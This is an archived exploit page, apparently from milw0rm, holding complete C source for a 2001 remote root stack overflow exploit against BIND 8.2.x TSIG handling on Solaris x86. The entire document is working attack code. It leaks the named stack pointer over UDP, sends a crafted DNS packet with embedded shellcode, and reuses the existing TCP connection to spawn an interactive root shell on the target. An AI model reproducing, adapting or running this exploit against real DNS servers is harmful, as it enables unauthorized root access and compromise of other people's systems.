<html><head><title>BIND 8.2.x (TSIG) Remote Root Stack Overflow Exploit (3)</title></head><pre>/*## copyright LAST STAGE OF DELIRIUM feb 2001 poland        *://lsd-pl.net/ #*/
/*## bind 8.2 8.2.1 8.2.2 8.2.2-PX                           Solaris 2.7 x86 #*/

/* The code establishes a TCP connection with port 53 of a target system.     */
/* It makes use of the &quot;infoleek&quot; bug (through UDP) to obtain the base        */
/* value of the named process frame stack pointer, which is later used        */
/* for constructing proper DNS tsig exploit packet.                           */
/*                                                                            */
/* Upon successful exploitation the assembly routine gets executed. It        */
/* walks the descriptor table of the exploited named process in a search      */
/* for the socket descriptor of the previously established TCP connection.    */
/* Found descriptor is duplicated on stdin, stdout and stderr and /bin/sh     */
/* is spawned.                                                                */
/*                                                                            */
/* The use of such an assembly routine allows successfull exploitation of     */
/* the vulnerability in the case when vulnerable dns servers are protected    */
/* by tightly configured firewall systems (with only 53 tcp/udp port open).   */

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;rpc/rpc.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;

char msg[]={
    0xab,0xcd,0x09,0x80,0x00,0x00,0x00,0x01,
    0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
    0x01,0x20,0x20,0x20,0x20,0x02,0x61
};

char asmcode[]=
    &quot;\x1b&quot;                 /* label len 1+26                 */
    &quot;\x90&quot;                 /* padding                        */

    &quot;\x33\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xeb\x09&quot;             /* jmp     &lt;syscallcode+13&gt;       */
    &quot;\x5f&quot;                 /* popl    %edi                   */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\x47&quot;                 /* incl    %edi                   */
    &quot;\xab&quot;                 /* stosl   %eax,%es:(%edi)        */
    &quot;\x47&quot;                 /* incl    %edi                   */
    &quot;\xaa&quot;                 /* stosb   %al,%es:(%edi)         */
    &quot;\x5e&quot;                 /* popl    %esi                   */
    &quot;\xeb\x0e&quot;             /* jmp     &lt;syscallcode+26+1&gt;     */
    &quot;\xe8\xf2\xff\xff\xff&quot; /* call    &lt;syscallcode+4&gt;        */
    &quot;\x9a\xff\xff\xff\xff&quot;
    &quot;\x07\xff&quot;
    &quot;\xc3&quot;                 /* ret                            */

    &quot;\x33&quot;                 /* label len 51                   */

    &quot;\x56&quot;                 /* pushl   %esi                   */
    &quot;\x5f&quot;                 /* popl    %edi                   */
    &quot;\x83\xef\x7c&quot;         /* subl    $0x7c,%edi             */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\x8d\x4f\x10&quot;         /* leal    0x10(%edi),%ecx        */
    &quot;\xb0\x44&quot;             /* movb    $0x44,%al              */
    &quot;\xab&quot;                 /* stosl   %eax,%es:(%edi)        */
    &quot;\xab&quot;                 /* stosl   %eax,%es:(%edi)        */
    &quot;\x91&quot;                 /* xchgl   %ecx,%eax              */
    &quot;\xab&quot;                 /* stosl   %eax,%es:(%edi)        */
    &quot;\x95&quot;                 /* xchgl   %eax,%ebp              */
    &quot;\x66\xb9\x91\x54&quot;     /* movw    $0x5491,%cx            */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x66\xb9\x01\x01&quot;     /* movw    $0x0101,%cx            */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x33\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x36&quot;             /* movb    $0x36,%al              */
    &quot;\xff\xd6&quot;             /* call    *%esi                  */
    &quot;\x59&quot;                 /* popl    %ecx                   */
    &quot;\x33\xdb&quot;             /* xorl    %ebx,%ebx              */
    &quot;\x3b\xc3&quot;             /* cmpl    %ebx,%eax              */
    &quot;\x75\x0a&quot;             /* jne     &lt;findsckcode+49&gt;       */
    &quot;\x66\xbb\x12\x34&quot;     /* movw    $0x1234,%bx            */
    &quot;\x66\x39\x5d\x02&quot;     /* cmpw    %bx,0x2(%ebp)          */
    &quot;\x74\x03&quot;             /* je      &lt;findsckcode+51+1&gt;     */
    &quot;\xe2\xe6&quot;             /* loop    &lt;findsckcode+25&gt;       */

    &quot;\x37&quot;                 /* label len 21+34                */

    &quot;\xb0\x09&quot;             /* movb    $0x09,%al              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x91&quot;                 /* xchgl   %ecx,%eax              */
    &quot;\xb1\x03&quot;             /* movb    $0x03,%cl              */
    &quot;\x49&quot;                 /* decl    %ecx                   */
    &quot;\x89\x4c\x24\x08&quot;     /* movl    %ecx,0x8(%esp)         */ 
    &quot;\x41&quot;                 /* incl    %ecx                   */
    &quot;\x33\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x3e&quot;             /* movb    $0x3e,%al              */
    &quot;\xff\xd6&quot;             /* call    *%esi                  */
    &quot;\xe2\xf2&quot;             /* loop    &lt;findsckcode+58+1&gt;     */

    &quot;\xeb\x13&quot;             /* jmp     &lt;shellcode+21&gt;         */
    &quot;\x33\xd2&quot;             /* xorl    %edx,%edx              */
    &quot;\x58&quot;                 /* popl    %eax                   */
    &quot;\x8d\x78\x14&quot;         /* leal    0x14(%eax),edi         */
    &quot;\x52&quot;                 /* pushl   %edx                   */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\xab&quot;                 /* stosl   %eax,%es:(%edi)        */
    &quot;\x92&quot;                 /* xchgl   %eax,%edx              */
    &quot;\xab&quot;                 /* stosl   %eax,%es:(%edi)        */
    &quot;\x88\x42\x08&quot;         /* movb    %al,0x8(%edx)          */
    &quot;\xb0\x3b&quot;             /* movb    $0x3b,%al              */
    &quot;\xff\xd6&quot;             /* call    *%esi                  */
    &quot;\xe8\xe8\xff\xff\xff&quot; /* call    &lt;shellcode+2&gt;          */
    &quot;/bin/ksh&quot;
;

int rev(int a){
    int i=1;
    if((*(char*)&amp;i)) return(a);
    return((a&gt;&gt;24)&amp;0xff)|(((a&gt;&gt;16)&amp;0xff)&lt;&lt;8)|(((a&gt;&gt;8)&amp;0xff)&lt;&lt;16)|((a&amp;0xff)&lt;&lt;24);
}

int main(int argc,char **argv){
    char buffer[1024],*b;
    int i,c,n,sck[2],fp,ptr6,jmp,cnt,ofs,flag=-1;
    struct hostent *hp;
    struct sockaddr_in adr;

    printf(&quot;copyright LAST STAGE OF DELIRIUM feb 2001 poland  //lsd-pl.net/\n&quot;);
    printf(&quot;bind 8.2 8.2.1 8.2.2 8.2.2PX for solaris 2.7 x86\n\n&quot;);

    if(argc&lt;2){
        printf(&quot;usage: %s address [-s][-e]\n&quot;,argv[0]);
        printf(&quot;    -s  send infoleek packet\n&quot;);
        printf(&quot;    -e  send exploit packet\n&quot;);
        exit(-1);
    }

    while((c=getopt(argc-1,&amp;argv[1],&quot;se&quot;))!=-1){
        switch(c){
        case 's': flag=1;break;
        case 'e': flag=2;
        }
    }
    if(flag==-1) exit(-1);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(53);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1) {
        if((hp=gethostbyname(argv[1]))==NULL) {
            errno=EADDRNOTAVAIL;goto err;
        }
        memcpy(&amp;adr.sin_addr.s_addr,hp-&gt;h_addr,4);
    }

    sck[0]=socket(AF_INET,SOCK_DGRAM,0);
    sck[1]=socket(AF_INET,SOCK_STREAM,0);

    if(connect(sck[0],(struct sockaddr*)&amp;adr,sizeof(adr))&lt;0) goto err;
    if(connect(sck[1],(struct sockaddr*)&amp;adr,sizeof(adr))&lt;0) goto err;

    i=sizeof(struct sockaddr_in);
    if(getsockname(sck[1],(struct sockaddr*)&amp;adr,&amp;i)==-1){
        struct netbuf {unsigned int maxlen;unsigned int len;char *buf;};
        struct netbuf nb;
        ioctl(sck[1],(('S'&lt;&lt;8)|2),&quot;sockmod&quot;);
        nb.maxlen=0xffff;
        nb.len=sizeof(struct sockaddr_in);;
        nb.buf=(char*)&amp;adr;
        ioctl(sck[1],(('T'&lt;&lt;8)|144),&amp;nb);
    }
    n=ntohs(adr.sin_port);

    asmcode[1+1+26+1+39+2]=(unsigned char)((n&gt;&gt;8)&amp;0xff);
    asmcode[1+1+26+1+39+3]=(unsigned char)(n&amp;0xff);

    if(write(sck[0],msg,sizeof(msg))==-1) goto err;
    if((cnt=read(sck[0],buffer,sizeof(buffer)))==-1) goto err;
   
    printf(&quot;stack dump:\n&quot;);
    for(i=0;i&lt;(cnt-512);i++){
        printf(&quot;%s%02x &quot;,(i&amp;&amp;(!(i%16)))?&quot;\n&quot;:&quot;&quot;,(unsigned char)buffer[512+i]);
    }
    printf(&quot;\n\n&quot;);

    fp=rev(*(unsigned int*)&amp;buffer[532]);
    ofs=0x0106-((fp-(fp&amp;0xffffff00))&amp;0xff);
    cnt=163;

    if((buffer[512+20+2]!=(char)0x04)&amp;&amp;(buffer[512+20+3]!=(char)0x08)){
        printf(&quot;system does not seem to be a vulnerable solaris\n&quot;);exit(1);
    }

    if(flag==1){
        printf(&quot;system seems to be running bind 8.2.x on a solaris\n&quot;);exit(-1);
    }

    if(cnt&lt;(ofs+12)){
        printf(&quot;frame ptr is too low to be successfully exploited\n&quot;);exit(-1);
    }

    jmp=rev(fp-583);
    ptr6=rev((fp&amp;0xffffff00)+8);
    fp=rev(fp&amp;0xffffff00);

    printf(&quot;frame ptr=0x%08x adr=%08x ofs=%d &quot;,rev(fp),rev(jmp),ofs);
    printf(&quot;port=%04x connected! &quot;,(unsigned short)n);fflush(stdout);

    b=buffer;
    memcpy(b,&quot;\xab\xcd\x01\x00\x00\x02\x00\x00\x00\x00\x00\x01&quot;,12);b+=12;
    for(i=0;i&lt;strlen(asmcode);i++) *b++=asmcode[i];
    for(i=0;i&lt;(120&gt;&gt;1);i++,b++) *b++=0x01;
    memcpy(b,&quot;\x00\x00\x01\x00\x01&quot;,5);b+=5;
    for(i=0;i&lt;((ofs+64)&gt;&gt;1);i++,b++) *b++=0x01;

    *b++=12;
    memcpy(b,&amp;jmp,4);b+=4;
    memcpy(b,&quot;\x06\x00\x00\x00&quot;,4);b+=4;
    memcpy(b,&amp;ptr6,4);b+=4;
    cnt-=ofs+12;
    for(i=0;i&lt;(cnt&gt;&gt;1);i++,b++) *b++=0x01;

    memcpy(b,&quot;\x00\x00\x01\x00\x01\x00\x00\xfa\xff&quot;,9);b+=9;

    if(write(sck[0],buffer,b-buffer)==-1) goto err;
    sleep(1);printf(&quot;sent!\n&quot;);

    write(sck[1],&quot;/bin/uname -a\n&quot;,14);
    while(1){
        fd_set fds;
        FD_ZERO(&amp;fds);
        FD_SET(0,&amp;fds);
        FD_SET(sck[1],&amp;fds);
        if(select(FD_SETSIZE,&amp;fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&amp;fds)){
                if((cnt=read(0,buf,1024))&lt;1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck[1],buf,cnt);
            }
            if(FD_ISSET(sck[1],&amp;fds)){
                if((cnt=read(sck[1],buf,1024))&lt;1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
    exit(0);
err:
    perror(&quot;error&quot;);exit(-1);
}

// milw0rm.com [2001-03-01]</pre></html>